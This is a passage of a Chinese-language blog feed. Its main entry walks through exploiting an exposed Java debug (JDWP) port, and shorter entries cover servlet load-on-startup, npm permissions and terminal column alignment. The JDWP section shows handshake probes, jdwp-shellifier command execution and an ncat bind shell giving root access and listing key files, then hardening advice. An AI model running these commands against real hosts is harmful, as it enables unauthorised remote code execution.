class="line">8283/tcp  open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_121</span><br><span class="line">8380/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">8399/tcp  open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_121</span><br><span class="line">8694/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">8967/tcp  open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_121</span><br><span class="line">8998/tcp  filtered canto-roboflow</span><br><span class="line">9001/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">9011/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">9058/tcp  open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_121</span><br><span class="line">9060/tcp  open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_171</span><br><span class="line">9260/tcp  open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_121</span><br><span class="line">9928/tcp  open     http           Jetty 9.2.24.v20180105</span><br><span class="line">9988/tcp  open     http           Jetty 9.2.24.v20180105</span><br><span class="line">9990/tcp  open     http           Jetty 9.4.7.v20170914</span><br><span class="line">9991/tcp  open     http           Jetty 9.4.8.v20171121</span><br><span class="line">9996/tcp  filtered palace-5</span><br><span class="line">9997/tcp  open     http           Jetty 9.4.8.v20171121</span><br><span class="line">9998/tcp  open     http           Jetty 9.4.7.v20170914</span><br><span class="line">9999/tcp  open     http           Jetty 9.2.24.v20180105</span><br><span class="line">10010/tcp open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_121</span><br><span class="line">10018/tcp open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_121</span><br><span class="line">11114/tcp open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_171</span><br><span class="line">11211/tcp open     memcached      Memcached 1.4.34 (uptime 20219548 seconds)</span><br><span class="line">12001/tcp open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">12003/tcp open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_121</span><br><span class="line">13001/tcp open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">13003/tcp open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_121</span><br><span class="line">14002/tcp open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">15001/tcp open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">18694/tcp open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_121</span><br><span class="line">19998/tcp open     http           Jetty 9.4.7.v20170914</span><br><span class="line">29998/tcp open     http           Jetty 9.4.7.v20170914</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 87.05 seconds</span><br></pre></td></tr></table></figure>
<p>ä¸Šé¢æ˜¯devæœºå™¨ä¸Šå¼€å¯çš„ç«¯å£ï¼Œ <code>Java Debug Wire Protocol (Reference Implementation)</code>å°±æ˜¯å¼€å¯äº†<code>JDWP</code>çš„æœºå™¨ã€‚</p>
<h2 id="äºŒæ¬¡ç¡®è®¤"><a href="#äºŒæ¬¡ç¡®è®¤" class="headerlink" title="äºŒæ¬¡ç¡®è®¤"></a>äºŒæ¬¡ç¡®è®¤</h2><blockquote>
<p>telnetç«¯å£åï¼Œè¾“å…¥å‘½ä»¤JDWP-Handshake<br>å¦‚æœè¿”å›JDWP-Handshakeï¼Œè¯æ˜å­˜åœ¨æ¼æ´ã€‚</p>
</blockquote>
<p>å¯ä»¥ç”¨ä¸‹é¢çš„å‘½ä»¤æµ‹è¯•ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">âœ  jdwp-shellifier (master|âœ”) &#123; <span class="built_in">echo</span> <span class="string">"JDWP-Handshake"</span>; sleep 20 &#125; | telnet 221.221.221.221 10010</span><br><span class="line">Trying 221.221.221.221...</span><br><span class="line">Connected to izbp16k6k2yv9vvh6c3v65zi.</span><br><span class="line">Escape character is <span class="string">'^]'</span>.</span><br><span class="line">JDWP-Handshake</span><br></pre></td></tr></table></figure>
<p>æˆ–è€…ä½¿ç”¨<code>nc</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">âœ  jdwp-shellifier (master|âœ”) &#123; <span class="built_in">echo</span> <span class="string">"JDWP-Handshake"</span>; sleep 1 | <span class="built_in">trap</span> <span class="built_in">exit</span> INT&#125; | nc 221.221.221.221 10010</span><br><span class="line">JDWP-Handshake</span><br></pre></td></tr></table></figure>
<h1 id="æ¼æ´åˆ©ç”¨å®æˆ˜"><a href="#æ¼æ´åˆ©ç”¨å®æˆ˜" class="headerlink" title="æ¼æ´åˆ©ç”¨å®æˆ˜"></a>æ¼æ´åˆ©ç”¨å®æˆ˜</h1><h2 id="ç¡®å®šdebugçš„ç«¯å£"><a href="#ç¡®å®šdebugçš„ç«¯å£" class="headerlink" title="ç¡®å®šdebugçš„ç«¯å£"></a>ç¡®å®šdebugçš„ç«¯å£</h2><p>é€šè¿‡<code>nmap</code>ç¡®å®šdebugçš„ç«¯å£ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">18694/tcp open     jdwp           Java Debug Wire Protocol (Reference Implementation)</span><br></pre></td></tr></table></figure>
<h2 id="nmapæ‰§è¡Œå‘½ä»¤"><a href="#nmapæ‰§è¡Œå‘½ä»¤" class="headerlink" title="nmapæ‰§è¡Œå‘½ä»¤"></a>nmapæ‰§è¡Œå‘½ä»¤</h2><p><a href="https://nmap.org/nsedoc/scripts/jdwp-exec.html" rel="external nofollow noopener noreferrer" target="_blank">jdwp-exec NSE Script</a></p>
<p><a href="https://nmap.org/nsedoc/scripts/jdwp-info.html" rel="external nofollow noopener noreferrer" target="_blank">jdwp-info NSE Script</a></p>
<p><a href="https://nmap.org/nsedoc/scripts/jdwp-inject.html" rel="external nofollow noopener noreferrer" target="_blank">jdwp-inject NSE Script</a></p>
<blockquote>
<p>è¿™ç§æ–¹å¼æ²¡æœ‰å®éªŒæˆåŠŸï¼Œæœ‰å…´è¶£çš„åŒå­¦å¯ä»¥è¯•ä¸€è¯•</p>
</blockquote>
<ul>
<li>Example Usage</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT &lt;target&gt; -p &lt;port&gt; --script=+jdwp-exec --script-args cmd=&quot;date&quot;</span><br></pre></td></tr></table></figure>
<ul>
<li>Script Output</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE REASON</span><br><span class="line">2010/tcp open  search  syn-ack</span><br><span class="line">| jdwp-exec:</span><br><span class="line">|   date output:</span><br><span class="line">|   Sat Aug 11 15:27:21 Central European Daylight Time 2012</span><br><span class="line">|_</span><br></pre></td></tr></table></figure>
<h2 id="å¼€æºè„šæœ¬"><a href="#å¼€æºè„šæœ¬" class="headerlink" title="å¼€æºè„šæœ¬"></a>å¼€æºè„šæœ¬</h2><p><a href="https://github.com/IOActive/jdwp-shellifier" rel="external nofollow noopener noreferrer" target="_blank">IOActive/jdwp-shellifier</a></p>
<p>ä½¿ç”¨ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">âœ  jdwp-shellifier (master|âœ”) python jdwp-shellifier.py -t 221.221.221.221 -p 10010  --<span class="built_in">break</span>-on <span class="string">"java.lang.String.indexOf"</span>  --cmd <span class="string">"touch /home/777"</span></span><br><span class="line">[+] Targeting <span class="string">'221.221.221.221:10010'</span></span><br><span class="line">[+] Reading settings <span class="keyword">for</span> <span class="string">'Java HotSpot(TM) 64-Bit Server VM - 1.8.0_121'</span></span><br><span class="line">[+] Found Runtime class: id=346d</span><br><span class="line">[+] Found Runtime.getRuntime(): id=7fd8f420b170</span><br><span class="line">[+] Created <span class="built_in">break</span> event id=2</span><br><span class="line">[+] Waiting <span class="keyword">for</span> an event on <span class="string">'java.lang.String.indexOf'</span></span><br><span class="line">[+] Received matching event from thread 0x355c</span><br><span class="line">[+] Selected payload <span class="string">'touch /home/777'</span></span><br><span class="line">[+] Command string object created id:355d</span><br><span class="line">[+] Runtime.getRuntime() returned context id:0x355e</span><br><span class="line">[+] found Runtime.exec(): id=7fd8f40140f0</span><br><span class="line">[+] Runtime.exec() successful, retId=355f</span><br><span class="line">[!] Command successfully executed</span><br></pre></td></tr></table></figure>
<p><code>break-on &quot;java.lang.String.indexOf&quot;</code>è¡¨ç¤ºåœ¨è¿™ä¸ªå‡½æ•°æ‰“æ–­ç‚¹ï¼Œå½“è¿™ä¸ªå‡½æ•°æ‰§è¡Œçš„æ—¶å€™ï¼Œ åé¢è·Ÿç€çš„å‘½ä»¤å°±ä¼šæ‰§è¡Œï¼Œè¿™æ—¶æˆ‘ä»¬ç™»å½•ä¸Šæœºå™¨æŸ¥çœ‹ä¸‹æ‰§è¡Œçš„ç»“æœï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@yd-dev-api server]<span class="comment"># ls -alh  /home</span></span><br><span class="line">æ€»ç”¨é‡ 52K</span><br><span class="line">drwxr-xr-x. 13 root          root          4.0K 8æœˆ  10 14:12 .</span><br><span class="line">dr-xr-xr-x. 28 root          root          4.0K 7æœˆ  19 17:52 ..</span><br><span class="line">-rw-r--r--   1 root          root             0 8æœˆ  10 14:12 777</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹åˆ°<code>777</code>è¿™ä¸ªæ–‡ä»¶å·²ç»åˆ›å»ºäº†ï¼Œ æ—¶é—´æ­£å¥½æ˜¯æˆ‘ä»¬æ‰§è¡Œå‘½ä»¤çš„æ—¶é—´ã€‚</p>
<p>è¿™åªæ˜¯åˆçº§ç©æ³•ï¼Œ è„šæœ¬çš„ç¤ºä¾‹ç»™çš„æ˜¯å¯åŠ¨ä¸€ä¸ª<code>ncat</code>çš„ç¨‹åºï¼Œ ç„¶åå°±å¯ä»¥è¿œç¨‹è¿æ¥ä¸Šè¿™ä¸ªncatå¼€å¯çš„ç«¯å£ï¼Œç›¸å½“äºæœ‰ä¸€ä¸ª<code>root</code>æƒé™çš„shelläº†ã€‚</p>
<p>å®‰è£…<code>ncat</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python jdwp-shellifier.py -t 221.221.221.221 -p 8399  --break-on &quot;java.lang.String.indexOf&quot;  --cmd  &quot;sudo yum install -y nc&quot;</span><br></pre></td></tr></table></figure>
<p><code>ncat</code>åœ¨æœåŠ¡å™¨ä¸Šå¼€å¯ä¸€ä¸ªç«¯å£ï¼Œ è½¬å‘è¾“å…¥äº¤ç»™<code>bash</code>å»æ‰§è¡Œã€‚</p>
<p>å¼€å¯è½¬å‘æœåŠ¡ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">âœ  jdwp-shellifier (master|âœ”) python jdwp-shellifier.py -t 221.221.221.221 -p 8399  --<span class="built_in">break</span>-on <span class="string">"java.lang.String.indexOf"</span>  --cmd  <span class="string">"ncat -v -l -p 7777 -e /bin/bash"</span></span><br><span class="line">[+] Targeting <span class="string">'221.221.221.221:8399'</span></span><br><span class="line">[+] Reading settings <span class="keyword">for</span> <span class="string">'Java HotSpot(TM) 64-Bit Server VM - 1.8.0_121'</span></span><br><span class="line">[+] Found Runtime class: id=345e</span><br><span class="line">[+] Found Runtime.getRuntime(): id=7f6420023408</span><br><span class="line">[+] Created <span class="built_in">break</span> event id=2</span><br><span class="line">[+] Waiting <span class="keyword">for</span> an event on <span class="string">'java.lang.String.indexOf'</span></span><br><span class="line">[+] Received matching event from thread 0x354e</span><br><span class="line">[+] Selected payload <span class="string">'ncat -v -l -p 7777 -e /bin/bash'</span></span><br><span class="line">[+] Command string object created id:354f</span><br><span class="line">[+] Runtime.getRuntime() returned context id:0x3550</span><br><span class="line">[+] found Runtime.exec(): id=7f6420023468</span><br><span class="line">[+] Runtime.exec() successful, retId=3551</span><br><span class="line">[!] Command successfully executed</span><br></pre></td></tr></table></figure>
<p>æœåŠ¡å™¨ä¸Šç«¯å£å·²ç»å¼€å¯ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@yd-dev-api server]# sudo lsof -i:7777</span><br><span class="line">COMMAND  PID USER   FD   TYPE    DEVICE SIZE/OFF NODE NAME</span><br><span class="line">ncat    7617 root    3u  IPv6 292856080      0t0  TCP *:cbt (LISTEN)</span><br><span class="line">ncat    7617 root    4u  IPv4 292856081      0t0  TCP *:cbt (LISTEN)</span><br></pre></td></tr></table></figure>
<p>è¿æ¥ä¸Šå»ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">âœ  jdwp-shellifier (master|âœ”) nc 221.221.221.221 7777</span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line">/root</span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">ls -alh</span><br><span class="line">total 218M</span><br><span class="line">dr-xr-x---. 18 root root 4.0K Aug 10 11:05 .</span><br><span class="line">dr-xr-xr-x. 28 root root 4.0K Jul 19 17:52 ..</span><br><span class="line">-rw-r--r--   1 root root   26 May 11 13:57 12.txt</span><br><span class="line">-rwxr-xr-x   1 root root 1.7K Jan 30  2018 214468302700277.key</span><br><span class="line">-rwxr-xr-x   1 root root 3.3K Jan 30  2018 214468302700277.pem</span><br></pre></td></tr></table></figure>
<h1 id="è¿œç¨‹è°ƒè¯•çš„å»ºè®®"><a href="#è¿œç¨‹è°ƒè¯•çš„å»ºè®®" class="headerlink" title="è¿œç¨‹è°ƒè¯•çš„å»ºè®®"></a>è¿œç¨‹è°ƒè¯•çš„å»ºè®®</h1><p>ä¸€ã€çº¿ä¸Šä¸èƒ½å¼€å¯debugï¼Œå¯¹æœåŠ¡å™¨æ€§èƒ½æœ‰å½±å“ã€‚</p>
<p>äºŒã€å…³é—­å¯¹å¤–è¿œç¨‹debugçš„ç«¯å£</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo lsof -i:&lt;port&gt;</span><br></pre></td></tr></table></figure>
<p>æŸ¥æ‰¾åˆ°å¯¹åº”çš„è¿›ç¨‹ï¼Œ ç„¶åä¿®æ”¹é…ç½®ï¼Œ<strong>é‡å¯tomcat</strong></p>
<p>ä¸‰ã€è¿œç¨‹debugæ­¥éª¤ï¼š</p>
<ol>
<li><p>tomcat å¼€å¯è°ƒè¯•: </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> CATALINA_OPTS=<span class="string">"-server -Xdebug -Xnoagent -Djava.compiler=NONE -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=127.0.0.1:8399"</span></span><br></pre></td></tr></table></figure>
<p><strong>æ³¨æ„å¿…é¡»ç»‘å®šåˆ°127.0.0.1</strong></p>
</li>
<li><p>å®‰è£…socat</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install -y socat</span><br></pre></td></tr></table></figure>
</li>
<li><p>æœåŠ¡å™¨å®‰è£…socatè¿›è¡Œè½¬å‘:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat TCP4-LISTEN:5005forkrange=0.0.0.0/32 TCP4:127.0.0.1:8399 | hostname -i</span><br></pre></td></tr></table></figure>
<p>å…¶ä¸­<code>0.0.0.0/32</code>è¡¨ç¤ºæ”¾å¼€ipé™åˆ¶ï¼ˆä¸æ˜¯å†…ç½‘æ²¡æœ‰åŠæ³•é™åˆ¶å‡ºå£ip)ï¼Œ <strong>å‘½ä»¤ä¸è¦åœ¨åå°æ‰§è¡Œ</strong>ï¼Œå¦åˆ™è·Ÿå¼€å¯äº†å¯¹å¤–çš„è¿œç¨‹debugæ²¡æœ‰åŒºåˆ«</p>
</li>
<li><p>ideaä¸­æ–°å»ºRemoteé…ç½®ï¼Œhostå†™ä¸Šé¢è¾“å‡ºçš„å…¬ç½‘çš„ipï¼Œ ç«¯å£å†™5005</p>
</li>
</ol>
<h1 id="ç»“è®º"><a href="#ç»“è®º" class="headerlink" title="ç»“è®º"></a>ç»“è®º</h1><ul>
<li>è¿œç¨‹è°ƒè¯•ç«¯å£çš„åœ°å€ä¸€å®šè¦ç»‘å®šåˆ°<code>127.0.0.1</code></li>
<li>tomcatç”¨å•ç‹¬çš„ç»„çš„ç”¨æˆ·å¯åŠ¨ï¼ˆè¿™ä¸ªç»„çš„æƒé™è¦è®¾ç½®åˆ°è¾ƒä½ï¼‰</li>
</ul>
<h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><ul>
<li><a href="https://www.ibm.com/developerworks/cn/java/j-lo-jpda1/index.html?ca=drs-" rel="external nofollow noopener noreferrer" target="_blank">æ·±å…¥ Java è°ƒè¯•ä½“ç³»: ç¬¬ 1 éƒ¨åˆ†ï¼ŒJPDA ä½“ç³»æ¦‚è§ˆ</a></li>
<li><a href="https://docs.oracle.com/javase/8/docs/technotes/guides/jpda/architecture.html" rel="external nofollow noopener noreferrer" target="_blank">Java Platform Debugger Architecture</a></li>
<li><a href="https://docs.oracle.com/javase/7/docs/technotes/guides/jpda/jdwp-spec.html" rel="external nofollow noopener noreferrer" target="_blank">Java(tm) Debug Wire Protocol</a></li>
<li><a href="http://files.meetup.com/3189882/Java%20Debugger%20Internals.pdf" rel="external nofollow noopener noreferrer" target="_blank">Java Debugger Internals - Meetup</a></li>
<li><a href="https://_thorns.gitbooks.io/sec/content/java_debug_remote_code_execution.html" rel="external nofollow noopener noreferrer" target="_blank">Java Debug Remote Code Execution Â· å®‰å…¨æ‰‹å†Œ</a></li>
<li><a href="https://secwiki.org/w/FAQ_missing_port" rel="external nofollow noopener noreferrer" target="_blank">FAQ missing port - SecWiki</a></li>
<li><a href="https://github.com/IOActive/jdwp-shellifier" rel="external nofollow noopener noreferrer" target="_blank">IOActive/jdwp-shellifier</a></li>
<li><a href="https://ioactive.com/hacking-java-debug-wire-protocol-or-how/" rel="external nofollow noopener noreferrer" target="_blank">Hacking the Java Debug Wire Protocol - or - â€œHow I met your Java debuggerâ€ | IOActive</a></li>
<li><a href="https://nmap.org/nsedoc/scripts/jdwp-exec.html" rel="external nofollow noopener noreferrer" target="_blank">jdwp-exec NSE Script</a></li>
<li><a href="https://nmap.org/nsedoc/scripts/jdwp-info.html" rel="external nofollow noopener noreferrer" target="_blank">jdwp-info NSE Script</a></li>
<li><a href="https://nmap.org/nsedoc/scripts/jdwp-inject.html" rel="external nofollow noopener noreferrer" target="_blank">jdwp-inject NSE Script</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> jvm </category>
            
        </categories>
        
        
        <tags>
            
            <tag> jdwp </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[web.xml]]></title>
      <url>http://qsli.github.io/2018/08/11/web-xml/</url>
      <content type="html"><![CDATA[<h2 id="load-on-startupæ ‡ç­¾"><a href="#load-on-startupæ ‡ç­¾" class="headerlink" title="load-on-startupæ ‡ç­¾"></a>load-on-startupæ ‡ç­¾</h2><blockquote>
<p>Servlets are initialized either lazily at request processing time or eagerly during<br>deployment. In the latter case, they are initialized in the order indicated by<br>their load-on-startup elements.</p>
</blockquote>
<p>åœ¨webå®¹å™¨å¯åŠ¨çš„æ—¶å€™ï¼Œå¯ä»¥é‡‡ç”¨<code>lazily</code>åŠ è½½çš„æ–¹å¼å’Œ<code>eagerly</code>çš„æ–¹å¼ã€‚</p>
<p><code>load-on-startup</code>ä¸­çš„å€¼å†³å®šäº†è¿›è¡Œå“ªç§æ–¹å¼ã€‚</p>
<blockquote>
<p>If the value is a negative integer, or the element is not present, the<br>container is free to load the servlet whenever it chooses. If the value is a positive<br>integer or 0, the container must load and initialize the servlet as the application is<br>deployed.</p>
</blockquote>
<p>å¦‚æœ<load-on-startup>è¿™ä¸ªå…ƒç´ æ²¡æœ‰å‡ºç°ï¼Œæˆ–è€…å‡ºç°äº†ä½†æ˜¯é‡Œé¢çš„å€¼æ˜¯è´Ÿçš„ï¼Œå®¹å™¨å¯ä»¥æŒ‰ç…§è‡ªå·±çš„éœ€è¦é€‰æ‹©åŠ è½½Servletçš„æ—¶æœºã€‚</load-on-startup></p>
<p>å¦‚æœé‡Œé¢çš„å€¼æ˜¯æ­£æ•°æˆ–è€…0ï¼Œå®¹å™¨å¿…é¡»ä¿è¯åœ¨å®¹å™¨å¯åŠ¨çš„æ—¶å€™åŠ è½½å’Œåˆå§‹åŒ–è¿™ä¸ªservlet</p>
<blockquote>
<p> The container must guarantee that servlets marked with lower integers<br>are loaded before servlets marked with higher integers.</p>
</blockquote>
<p>è¿™ä¸ªå€¼è¶Šå°ï¼Œä¼˜å…ˆçº§è¶Šé«˜ï¼Œå®¹å™¨ä¼˜å…ˆåŠ è½½ã€‚</p>
<blockquote>
<p>The container may choose<br>the order of loading of servlets with the same load-on-startup value.</p>
</blockquote>
<p>å¦‚æœé‡Œé¢çš„å€¼æ˜¯ä¸€æ ·çš„ï¼Œé‚£ä¹ˆåŠ è½½çš„é¡ºåºç”±å®¹å™¨æ¥å†³å®šï¼ˆä¸åŒå®ç°å¯èƒ½ä¸åŒï¼‰</p>
<h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><ol>
<li>Java Servlet Specification 3.0</li>
</ol>
]]></content>
      
        <categories>
            
            <category> tomcat </category>
            
        </categories>
        
        
        <tags>
            
            <tag> servlet </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[hexoè¿ç§»åˆ°ubuntu]]></title>
      <url>http://qsli.github.io/2018/08/11/hexo-ubuntu/</url>
      <content type="html"><![CDATA[<p>ç³»ç»Ÿåˆ‡æ¢åˆ°ubuntuä¹‹åï¼Œä½¿ç”¨çš„aptå®‰è£…çš„nodeï¼Œé»˜è®¤æƒé™æ˜¯sudoã€‚å®‰è£…hexoä¹‹åä¹Ÿå¿…é¡»ä»¥sudoèº«ä»½æ‰§è¡Œã€‚<br>éœ€è¦ä¿®æ”¹ä¸‹nodeçš„æƒé™ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">âœ  qsli.github.com (hexo|âœš1â€¦)  npm config get prefix</span><br><span class="line">/usr/local</span><br></pre></td></tr></table></figure>
<p>ä¿®æ”¹owner</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chown -R $(whoami) $(npm config get prefix)/&#123;lib/node_modules,bin,share&#125;</span><br></pre></td></tr></table></figure>
<p>ä¿®æ”¹ownerä¹‹åå°±å¯ä»¥æ­£å¸¸æ‰§è¡Œhexoäº†ã€‚</p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ol>
<li><a href="https://docs.npmjs.com/getting-started/fixing-npm-permissions" rel="external nofollow noopener noreferrer" target="_blank">03 - Fixing npm permissions | npm Documentation</a></li>
</ol>
]]></content>
      
        <categories>
            
            <category> hexo </category>
            
        </categories>
        
        
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[linuxç»ˆç«¯å¯¹é½é—®é¢˜]]></title>
      <url>http://qsli.github.io/2018/07/11/column-view/</url>
      <content type="html"><![CDATA[<h2 id="è¾“å‡ºä¹±äº†"><a href="#è¾“å‡ºä¹±äº†" class="headerlink" title="è¾“å‡ºä¹±äº†?"></a>è¾“å‡ºä¹±äº†?</h2><p>æ¯”å¦‚<code>vmstat</code>å‘½ä»¤, è¾“å‡ºæ­ªæ­ªæ‰­æ‰­çš„, å¼ºè¿«ç—‡ç®€ç›´ä¸èƒ½å¿å•Š, è€Œä¸”çœ‹ä¸ªæŒ‡æ ‡è¿˜å¾—å…ˆå¯¹é½ä¸‹.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">âœ  ~  vmstat 1 </span><br><span class="line">procs -----------memory---------- ---swap-- -----io---- -system-- ------cpu-----</span><br><span class="line"> r  b   swpd   free   buff  cache   si   so    bi    bo   in   cs us sy id wa st</span><br><span class="line"> 0  0      0 4577556 281532 3674532    0    0    64    36  192  784  5  1 93  1  0</span><br><span class="line"> 0  0      0 4577992 281532 3674552    0    0     0     0  417 1089  1  1 98  0  0</span><br><span class="line"> 0  0      0 4577960 281540 3674532    0    0     0    44  401 1105  1  0 98  1  0</span><br><span class="line"> 2  0      0 4577960 281540 3674548    0    0     0     0  307  834  1  0 99  0  0</span><br><span class="line"> 0  0      0 4577960 281548 3674548    0    0     0    48  318  773  1  0 99  1  0</span><br></pre></td></tr></table></figure>
<h2 id="è§£å†³æ–¹æ¡ˆ"><a href="#è§£å†³æ–¹æ¡ˆ" class="headerlink" title="è§£å†³æ–¹æ¡ˆ"></a>è§£å†³æ–¹æ¡ˆ</h2><h3 id="å…¶å®-åŠ ä¸ªcolumnå°±å¥½äº†"><a href="#å…¶å®-åŠ ä¸ªcolumnå°±å¥½äº†" class="headerlink" title="å…¶å®, åŠ ä¸ªcolumnå°±å¥½äº†"></a>å…¶å®, åŠ ä¸ª<code>column</code>å°±å¥½äº†</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">âœ  ~  vmstat 1 5 | column -t</span><br><span class="line">procs  -----------memory----------  ---swap--  -----io----  -system--  ------cpu-----</span><br><span class="line">r      b                            swpd       free         buff       cache           si  so  bi  bo   in   cs    us  sy  id  wa  st</span><br><span class="line">5      0                            0          4565016      281996     3675732         0   0   63  36   192  784   5   1   93  1   0</span><br><span class="line">0      0                            0          4564836      281996     3675756         0   0   0   0    345  805   1   0   99  1   0</span><br><span class="line">0      0                            0          4564744      282004     3675736         0   0   0   88   489  1305  1   0   98  0   0</span><br><span class="line">2      0                            0          4565456      282004     3675736         0   0   0   0    401  1042  1   0   99  0   0</span><br><span class="line">0      0                            0          4566400      282016     3675736         0   0   0   132  823  2357  1   1   98  1   0</span><br></pre></td></tr></table></figure>
<p>æ•´æ•´é½é½å•Š, ç¥æ¸…æ°”çˆ½, ä¸è¿‡å¦‚æœä½¿ç”¨<code>vmstat 1 | column -t</code>å°±ä¼šæ²¡æœ‰ä»»ä½•è¾“å‡º,  <code>vmstat 1</code>ç›¸å½“äºæ¯ä¸€ç§’è¾“å‡ºä¸€è¡Œ, <code>column -t</code>ä¼šä¸€ç›´å‚»å‚»åœ°ç­‰ç€, æ‰€ä»¥ä»€ä¹ˆéƒ½çœ‹ä¸åˆ°.</p>
<p>çœ‹ä¸‹manual:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-t      Determine the number of columns the input contains and create a table.  Columns are delimited with whitespace, by default, or</span><br><span class="line">             with the characters supplied using the -s option.  Useful for pretty-printing displays.</span><br></pre></td></tr></table></figure>
